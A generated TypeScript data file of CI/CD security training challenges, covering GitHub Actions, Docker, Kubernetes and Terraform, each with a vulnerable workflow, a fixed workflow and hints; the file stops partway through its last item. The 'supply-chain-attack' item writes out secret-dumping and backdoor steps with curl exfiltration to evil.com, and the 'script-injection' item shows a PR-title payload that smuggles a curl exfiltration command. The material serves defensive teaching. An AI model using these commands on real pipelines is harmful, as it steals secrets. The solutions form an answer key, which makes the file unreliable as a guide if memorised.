/**
 * GENERATED — do not edit by hand.
 * Produced by `npm run gen-challenges` from the challenges/ source dirs.
 * Powers the offline (Pages, no backend) fallback.
 */
export interface StaticChallenge {
  id: string;
  title: string;
  level: string;
  topic: string;
  points: number;
  estimatedTime: string;
  description: string;
  tags: string[];
  scenario: string;
  vulnerableWorkflow: string;
  solutionWorkflow: string;
  hints: string[];
  hintsPenalty: number;
}

export const STATIC_CHALLENGES: StaticChallenge[] = [
  {
    "id": "secrets-leak",
    "title": "Don't Leak Your Secrets",
    "level": "beginner",
    "topic": "github-actions",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow accidentally leaks AWS credentials in the build logs.\nFind the secrets exposure and fix it before an attacker can harvest your keys.\n",
    "tags": [
      "secrets",
      "aws",
      "logging"
    ],
    "scenario": "# Scenario: Secrets Leak\n\nYou've just joined the team maintaining a Node.js application. While reviewing the CI pipeline, you notice the build step logs show AWS credentials in plaintext.\n\nThe previous developer hardcoded the AWS keys directly into the workflow YAML for \"convenience.\" Every build since then has exposed these credentials in the GitHub Actions logs.\n\n**Your mission:** Remove the hardcoded secrets and use GitHub's secrets mechanism instead.\n\n## What's at risk?\n- AWS account compromise\n- Unauthorized resource access\n- Potential data breach\n",
    "vulnerableWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build\n        run: |\n          echo \"Building application...\"\n          echo \"AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\"\n          echo \"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n          npm run build\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE\n          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n        run: |\n          echo \"Deploying to AWS...\"\n          echo \"Deploy complete\"\n",
    "solutionWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          echo \"Deploying to AWS...\"\n          echo \"Deploy complete\"\n",
    "hints": [
      "# Hint 1: Where are the secrets?\n\nLook at the `env:` section of the workflow. Hardcoded credentials in YAML are visible to anyone with repository access.\n",
      "# Hint 2: How to fix it\n\nReplace the hardcoded values with `${{ secrets.AWS_ACCESS_KEY_ID }}` and `${{ secrets.AWS_SECRET_ACCESS_KEY }}`. Then add those secrets in your repository Settings → Secrets → Actions.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "permissions-overkill",
    "title": "Too Much Power",
    "level": "beginner",
    "topic": "github-actions",
    "points": 75,
    "estimatedTime": "8m",
    "description": "This workflow uses overly broad permissions. A compromised step could\nmodify code, create releases, or access other repository resources.\nApply the principle of least privilege.\n",
    "tags": [
      "permissions",
      "least-privilege"
    ],
    "scenario": "# Scenario: Permissions Overkill\n\nYour team's workflow has `permissions: write-all` at the top level. This was added \"just in case\" but it means every job in the workflow can modify your code, create releases, and access Actions secrets.\n\nA malicious dependency in your npm packages could exploit these broad permissions to push code directly to main.\n\n**Your mission:** Restrict permissions to only what each job actually needs.\n",
    "vulnerableWorkflow": "name: CI Pipeline\n\non:\n  push:\n    branches: [main]\n\npermissions: write-all\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n      - name: Deploy\n        run: echo \"Deploying...\"\n",
    "solutionWorkflow": "name: CI Pipeline\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout@v4\n      - name: Deploy\n        run: echo \"Deploying...\"\n",
    "hints": [
      "# Hint 1: What does write-all mean?\n\n`permissions: write-all` grants write access to ALL available scopes: contents, packages, actions, deployments, issues, pull-requests, etc. Most CI jobs only need `contents: read`.\n",
      "# Hint 2: The fix\n\nReplace `permissions: write-all` with specific permissions. A build job typically only needs `contents: read`. Deploy jobs might also need `id-token: write` for OIDC.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "unsafe-deps",
    "title": "Trust No One",
    "level": "beginner",
    "topic": "github-actions",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow pins actions by mutable tag (v3) instead of commit SHA.\nA compromised action could be updated to inject malicious code.\nPin actions to full commit SHAs for supply chain safety.\n",
    "tags": [
      "supply-chain",
      "actions",
      "pinning"
    ],
    "scenario": "# Scenario: Unsafe Dependencies\n\nYour workflow uses `@v3` tags to reference GitHub Actions. Tags are mutable — the same tag can point to different code over time.\n\nIf the `actions/checkout` action's repository were compromised, an attacker could push a new version under the `v3` tag that steals your code or secrets.\n\n**Your mission:** Pin all actions to full commit SHAs. You can find the SHA for each action version on its GitHub releases page.\n",
    "vulnerableWorkflow": "name: Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v3\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n",
    "solutionWorkflow": "name: Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n\n      - name: Setup Node.js\n        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n",
    "hints": [
      "# Hint 1: Tags vs SHAs\n\nGit tags can be moved. `@v3` might point to commit ABC today and commit XYZ tomorrow. Commit SHAs are immutable — `@a]1b2c3d...` always refers to the same code.\n",
      "# Hint 2: Finding the SHA\n\nGo to the action's GitHub repository → Releases → find the version you want → copy the full commit SHA from the release tag.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "error-swallowing",
    "title": "Don't Swallow Errors",
    "level": "beginner",
    "topic": "github-actions",
    "points": 75,
    "estimatedTime": "8m",
    "description": "This workflow swallows build errors with `|| echo`. If the build fails,\nthe pipeline continues and may deploy broken code. Let failures propagate.\n",
    "tags": [
      "reliability",
      "error-handling"
    ],
    "scenario": "# Scenario: Error Swallowing\n\nYour deploy pipeline uses `|| echo` after critical commands like `npm test` and `npm run build`. This means even if tests fail or the build breaks, the pipeline continues and may deploy broken code to production.\n\n**Your mission:** Remove the error swallowing so failures stop the pipeline.\n",
    "vulnerableWorkflow": "name: Deploy Pipeline\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Lint\n        run: npm run lint || echo \"Linting failed, continuing...\"\n\n      - name: Test\n        run: npm test || echo \"Tests failed, continuing...\"\n\n      - name: Build\n        run: npm run build || echo \"Build failed, continuing...\"\n\n      - name: Deploy\n        run: echo \"Deploying to production...\"\n",
    "solutionWorkflow": "name: Deploy Pipeline\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Lint\n        run: npm run lint\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        run: echo \"Deploying to production...\"\n",
    "hints": [
      "# Hint 1: What does || echo do?\n\nIn bash, `command || echo \"failed\"` runs the command, and if it fails, runs `echo` instead. The exit code of the whole expression is 0 (success), so GitHub Actions thinks the step passed.\n",
      "# Hint 2: The fix\n\nSimply remove `|| echo \"...\"` from the commands. Let them fail naturally — GitHub Actions will mark the step as failed and stop the pipeline.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "unverified-script",
    "title": "Verify Before You Run",
    "level": "beginner",
    "topic": "github-actions",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow downloads and executes a remote script without verification.\nAn attacker could modify the script to inject malicious code.\nAlways verify checksums before executing downloaded code.\n",
    "tags": [
      "supply-chain",
      "script-execution"
    ],
    "scenario": "# Scenario: Unverified Script Execution\n\nYour pipeline downloads a setup script from a remote server and pipes it directly to bash. The script URL is hardcoded and there's no integrity verification.\n\nIf the remote server is compromised, or if a MITM attack intercepts the download, malicious code would execute in your CI environment with access to your secrets.\n\n**Your mission:** Download the script first, verify its integrity, then execute it.\n",
    "vulnerableWorkflow": "name: Setup and Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install custom tools\n        run: curl -sSL https://example.com/setup.sh | bash\n\n      - name: Build\n        run: npm run build\n",
    "solutionWorkflow": "name: Setup and Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Download setup script\n        run: curl -sSL -o setup.sh https://example.com/setup.sh\n\n      - name: Verify checksum\n        run: echo \"abc123def456  setup.sh\" | sha256sum -c -\n\n      - name: Install custom tools\n        run: bash setup.sh\n\n      - name: Build\n        run: npm run build\n",
    "hints": [
      "# Hint 1: The danger of piping\n\n`curl URL | bash` downloads and executes in one step. You never see what you're running. A compromised server or MITM attack could inject anything.\n",
      "# Hint 2: The safe pattern\n\nDownload the script to a file first: `curl -o setup.sh URL`. Then verify its SHA256 checksum: `echo \"expected_hash  setup.sh\" | sha256sum -c -`. Only then execute it.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "env-dumping",
    "title": "Debugging Gone Wrong",
    "level": "beginner",
    "topic": "github-actions",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow dumps environment variables to the logs for debugging.\nBut environment variables include secrets — and CI logs are stored forever.\nRemove the env dump to prevent credential exposure.\n",
    "tags": [
      "secrets",
      "logging",
      "env"
    ],
    "scenario": "# Scenario: Debugging Gone Wrong\n\nA developer added a debugging step to figure out why the build was failing. The step dumps all environment variables to the CI logs using `env | grep` and `printenv`.\n\nUnfortunately, CI logs are stored indefinitely and are accessible to anyone with repository read access. Every secret — AWS keys, API tokens, database passwords — is now exposed in plaintext.\n\n**Your mission:** Remove the environment dump step to prevent credential leakage.\n\n## What's at risk?\n- All CI/CD secrets exposed in logs\n- AWS account compromise\n- Third-party API abuse\n",
    "vulnerableWorkflow": "name: Build and Test\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Debug environment\n        run: |\n          echo \"=== Environment Variables ===\"\n          env | grep -i \"secret\\|token\\|key\\|password\"\n          printenv\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
    "solutionWorkflow": "name: Build and Test\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
    "hints": [
      "# Hint 1: Where are the secrets?\n\nEnvironment variables in CI include secrets you've configured (like `secrets.AWS_ACCESS_KEY_ID`). Commands like `env`, `printenv`, or `env | grep` dump everything — including those secrets.\n",
      "# Hint 2: The fix\n\nRemove the entire step that dumps environment variables. If you need to debug environment issues, use `echo $SPECIFIC_VAR` for non-sensitive variables only, or use `::mask::` for sensitive ones.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "docker-running-as-root",
    "title": "Container Root Trap",
    "level": "beginner",
    "topic": "docker",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow builds a Docker image that runs as root. If the container\nis compromised, the attacker has full root access to the host kernel.\nAdd a non-root USER instruction to your Dockerfile.\n",
    "tags": [
      "docker",
      "root",
      "container-security"
    ],
    "scenario": "# Scenario: Container Root Trap\n\nYour CI pipeline builds and pushes Docker images. The inline Dockerfile doesn't specify a `USER` instruction, so the container runs as root by default.\n\nIf an attacker escapes the container (via a kernel vulnerability or misconfiguration), they have full root access to the host system. Running as root inside a container also means any vulnerability in your app can be leveraged for container escape.\n\n**Your mission:** Add a non-root `USER` instruction to the Dockerfile.\n",
    "vulnerableWorkflow": "name: Build Docker Image\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: |\n          echo \"Pushing to registry...\"\n          docker push myapp:latest\n",
    "solutionWorkflow": "name: Build Docker Image\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          RUN adduser --system --group nonroot\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          USER nonroot\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: |\n          echo \"Pushing to registry...\"\n          docker push myapp:latest\n",
    "hints": [
      "# Hint 1: Default behavior\n\nDocker containers run as root (UID 0) by default. If there's no `USER` instruction in the Dockerfile, the process inside the container has root privileges.\n",
      "# Hint 2: The fix\n\nAdd `USER nonroot` or `USER 1000` to your Dockerfile after installing packages but before the CMD/ENTRYPOINT. Create the user first with `RUN adduser --system --group nonroot` if needed.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "k8s-privileged-pod",
    "title": "Privileged Pod Escape",
    "level": "beginner",
    "topic": "kubernetes",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow deploys a Kubernetes manifest with a privileged container.\nPrivileged containers have full access to the host — equivalent to root on the node.\nRemove the privileged flag and add specific capabilities only if needed.\n",
    "tags": [
      "kubernetes",
      "privileged",
      "pod-security"
    ],
    "scenario": "# Scenario: Privileged Pod Escape\n\nYour CI pipeline deploys a Kubernetes manifest that includes a pod with `privileged: true`. This was added because \"something wasn't working\" and the developer looked up the fastest fix.\n\nA privileged container can:\n- Access all host devices via `/dev/`\n- Mount the host filesystem\n- Modify kernel parameters\n- Escape to full node compromise\n\n**Your mission:** Remove `privileged: true` from the security context. If the app needs specific capabilities, add only the ones it requires using `capabilities.add`.\n",
    "vulnerableWorkflow": "name: Deploy to Kubernetes\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply manifest\n        run: |\n          cat <<'EOF' > deployment.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: webapp\n          spec:\n            replicas: 3\n            selector:\n              matchLabels:\n                app: webapp\n            template:\n              metadata:\n                labels:\n                  app: webapp\n              spec:\n                containers:\n                  - name: webapp\n                    image: myapp:latest\n                    securityContext:\n                      privileged: true\n                    ports:\n                      - containerPort: 3000\n          EOF\n          kubectl apply -f deployment.yml\n",
    "solutionWorkflow": "name: Deploy to Kubernetes\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply manifest\n        run: |\n          cat <<'EOF' > deployment.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: webapp\n          spec:\n            replicas: 3\n            selector:\n              matchLabels:\n                app: webapp\n            template:\n              metadata:\n                labels:\n                  app: webapp\n              spec:\n                containers:\n                  - name: webapp\n                    image: myapp:latest\n                    securityContext:\n                      runAsNonRoot: true\n                      readOnlyRootFilesystem: true\n                      allowPrivilegeEscalation: false\n                    ports:\n                      - containerPort: 3000\n          EOF\n          kubectl apply -f deployment.yml\n",
    "hints": [
      "# Hint 1: What privileged: true does\n\nA privileged container is equivalent to root on the host node. It can access all devices, mount any filesystem, and modify kernel settings. It breaks all container isolation boundaries.\n",
      "# Hint 2: The fix\n\nRemove `privileged: true` from `securityContext`. If the app needs specific capabilities, use `capabilities: { add: [\"NET_BIND_SERVICE\"] }` to add only what's needed. Most apps don't need any special capabilities.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "tf-state-in-git",
    "title": "State in Version Control",
    "level": "beginner",
    "topic": "terraform",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow commits Terraform state files to git. State files contain\nsecrets (database passwords, API keys) and cause merge conflicts.\nUse remote state and add *.tfstate to .gitignore.\n",
    "tags": [
      "terraform",
      "state",
      "git"
    ],
    "scenario": "# Scenario: State in Version Control\n\nYour CI pipeline runs `terraform apply` and then commits the `.tfstate` file back to git \"for safekeeping.\" This is a critical mistake.\n\nTerraform state files contain:\n- All resource attributes (including sensitive ones)\n- Database passwords, API keys, and certificates in plaintext\n- Infrastructure topology that aids attackers\n\nAdditionally, multiple developers running terraform simultaneously cause state file merge conflicts, potentially corrupting your infrastructure.\n\n**Your mission:** Remove the `git add *.tfstate` step and configure remote state storage instead.\n",
    "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Plan\n        run: terraform plan -out=tfplan\n\n      - name: Apply\n        run: terraform apply -auto-approve tfplan\n\n      - name: Commit state\n        run: |\n          git config user.name \"terraform-bot\"\n          git config user.email \"bot@example.com\"\n          git add *.tfstate .terraform/\n          git commit -m \"Update state\" || echo \"No changes\"\n          git push\n",
    "solutionWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Plan\n        run: terraform plan -out=tfplan\n\n      - name: Apply\n        run: terraform apply -auto-approve tfplan\n",
    "hints": [
      "# Hint 1: What's in state\n\nTerraform state tracks every resource attribute, including secrets you've set as variables. A `.tfstate` file in git means your AWS keys, database passwords, and API tokens are in your repository history — forever.\n",
      "# Hint 2: The fix\n\nRemove `git add *.tfstate` from the workflow. Add `*.tfstate` and `.terraform/` to `.gitignore`. Configure a remote backend (S3, GCS, Terraform Cloud) in your `backend \"s3\" {}` block.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "mon-no-build-status",
    "title": "Invisible Failures",
    "level": "beginner",
    "topic": "monitoring",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow doesn't report build status back to the commit. When builds\nfail, nobody knows — broken code gets merged silently. Add status checks\nto make failures visible.\n",
    "tags": [
      "monitoring",
      "status",
      "visibility"
    ],
    "scenario": "# Scenario: Invisible Failures\n\nYour team's CI pipeline runs tests and builds, but doesn't report the status back to GitHub. Developers push code, the build runs, but nobody checks if it passed or failed.\n\nBroken code is being merged because there's no status check blocking the PR. The team only discovers failures after deployment — in production.\n\n**Your mission:** Add a step that reports the build status back to the commit using `actions/github-script` so that failures are visible and can block merges.\n",
    "vulnerableWorkflow": "name: CI Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
    "solutionWorkflow": "name: CI Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n      - name: Report status\n        if: always()\n        uses: actions/github-script@v7\n        with:\n          script: |\n            const status = '${{ job.status }}' === 'success' ? 'success' : 'failure';\n            github.rest.repos.createCommitStatus({\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              sha: context.sha,\n              state: status,\n              description: `Build ${status}`,\n              context: 'CI Build'\n            });\n",
    "hints": [
      "# Hint 1: Why status matters\n\nWithout commit status checks, there's no gate preventing broken code from merging. GitHub branch protection rules rely on status checks to block PRs with failing builds.\n",
      "# Hint 2: The fix\n\nAdd an `actions/github-script` step that calls `github.rest.repos.createCommitStatus()` to set the commit status to success or failure. This makes the build result visible on the commit and enables branch protection rules.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "supply-chain-attack",
    "title": "Supply Chain Defense",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 200,
    "estimatedTime": "20m",
    "description": "A malicious PR modifies this workflow to exfiltrate secrets and inject\nbackdoors. Identify all stages of the attack chain and secure the pipeline.\n",
    "tags": [
      "supply-chain",
      "attacks",
      "defense-in-depth"
    ],
    "scenario": "# Scenario: Supply Chain Attack\n\nA contributor submitted a PR that modifies your CI workflow. The changes look innocent at first glance, but hidden in the diff are several malicious steps:\n\n1. A step that dumps environment variables (harvesting secrets)\n2. A step that modifies your source code (injecting a backdoor)\n3. A step that exfiltrates data to an external server\n\n**Your mission:** Identify and remove all malicious steps, then secure the workflow against similar attacks.\n\n## Key defenses to implement:\n- Restrict what PRs can do (limit permissions)\n- Don't run untrusted code in CI\n- Validate artifact integrity\n- Monitor for suspicious behavior\n",
    "vulnerableWorkflow": "name: PR Build\n\non:\n  pull_request:\n    branches: [main]\n\npermissions: write-all\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      # Attacker steps hidden among legitimate build steps\n\n      - name: Cache restore\n        run: |\n          env | grep -i \"secret\\|token\\|key\\|aws\" > /tmp/env_dump.txt\n          cat /tmp/env_dump.txt\n\n      - name: Update dependencies\n        run: |\n          echo 'console.log(\"Backdoor: \" + process.env.AWS_SECRET_ACCESS_KEY)' >> src/index.js\n          echo 'require(\"child_process\").exec(\"curl -X POST https://evil.com/steal -d @/tmp/env_dump.txt\")' >> src/index.js\n\n      - name: Upload build\n        run: |\n          curl -X POST https://evil.com/exfil -d @src/index.js\n          echo \"Build uploaded successfully\"\n",
    "solutionWorkflow": "name: PR Build\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Verify source integrity\n        run: |\n          git diff --exit-code src/ || (echo \"Source modified!\" && exit 1)\n",
    "hints": [
      "# Hint 1: Look for environment dumps\n\nSearch for steps that use `env`, `printenv`, or dump variables to the log. These are credential harvesting techniques.\n",
      "# Hint 2: Check for file modifications\n\nLook for steps that use `>>`, `echo >>`, or `tee` to append content to source files. This is how attackers inject backdoors.\n",
      "# Hint 3: Find the exfiltration\n\nLook for `curl` or `wget` commands that POST data to external URLs. Attackers use these to send stolen data to their servers.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "artifact-tampering",
    "title": "Artifact Integrity",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow uploads build artifacts without integrity checks.\nAn attacker could tamper with artifacts between build and deploy.\nAdd checksums to verify artifact integrity.\n",
    "tags": [
      "artifacts",
      "integrity",
      "checksums"
    ],
    "scenario": "# Scenario: Artifact Tampering\n\nYour pipeline builds an artifact in one job and deploys it in another. The artifact is uploaded and downloaded using GitHub's artifact actions, but there's no integrity verification.\n\nIf an attacker gains access to the workflow (via a compromised action or malicious PR), they could swap the artifact between build and deploy.\n\n**Your mission:** Add SHA256 checksum generation and verification to ensure artifact integrity.\n",
    "vulnerableWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Download artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Deploy\n        run: |\n          echo \"Deploying artifact...\"\n          echo \"Deploy complete\"\n",
    "solutionWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Generate checksums\n        run: sha256sum dist/** > checksums.txt\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Upload checksums\n        uses: actions/upload-artifact@v4\n        with:\n          name: checksums\n          path: checksums.txt\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Download artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Download checksums\n        uses: actions/download-artifact@v4\n        with:\n          name: checksums\n          path: checksums.txt\n\n      - name: Verify integrity\n        run: sha256sum -c checksums.txt\n\n      - name: Deploy\n        run: |\n          echo \"Deploying artifact...\"\n          echo \"Deploy complete\"\n",
    "hints": [
      "# Hint 1: Generate checksums\n\nAfter building, generate a SHA256 checksum of your artifact: `sha256sum dist/* > checksums.txt`. Upload the checksum file alongside your artifact.\n",
      "# Hint 2: Verify before deploy\n\nIn the deploy job, download both the artifact and checksum file. Verify with: `sha256sum -c checksums.txt`. If verification fails, the deploy should stop.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "script-injection",
    "title": "Script Injection Defense",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow is vulnerable to script injection via GitHub context\nvariables. An attacker can craft PR titles or issue bodies that\nexecute arbitrary code. Sanitize all user-controlled inputs.\n",
    "tags": [
      "injection",
      "github-context",
      "script-execution"
    ],
    "scenario": "# Scenario: Script Injection\n\nYour workflow uses GitHub context variables directly in `run:` steps. For example, it echoes the PR title or issue body. An attacker can create a PR with a title like:\n\n```\ntitle\"; curl https://evil.com/steal -d \"$(env)\"; echo \"\n```\n\nThis breaks out of the echo command and executes arbitrary code.\n\n**Your mission:** Sanitize all user-controlled inputs before using them in shell commands.\n",
